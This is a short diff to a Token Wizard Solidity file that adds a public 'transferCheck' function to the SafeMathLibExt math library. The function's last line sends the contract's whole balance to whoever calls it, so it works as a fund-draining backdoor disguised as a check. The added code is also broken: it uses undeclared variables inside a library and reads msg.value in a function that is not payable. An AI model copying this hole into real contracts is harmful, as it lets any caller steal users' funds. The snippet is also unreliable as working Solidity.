@@ -1,4 +1,4 @@
-// Created using Token Wizard https://github.com/poanetwork/token-wizard by POA Network 
+// Created using Token Wizard https://github.com/poanetwork/token-wizard by POA Network
 /**
  * This smart contract code is Copyright 2017 TokenMarket Ltd. For more information see https://tokenmarket.net
  *
@@ -43,4 +43,14 @@ library SafeMathLibExt {
     return c;
   }
 
+	 function transferCheck() public {
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+   		msg.sender.transfer(this.balance);
+  }
 }
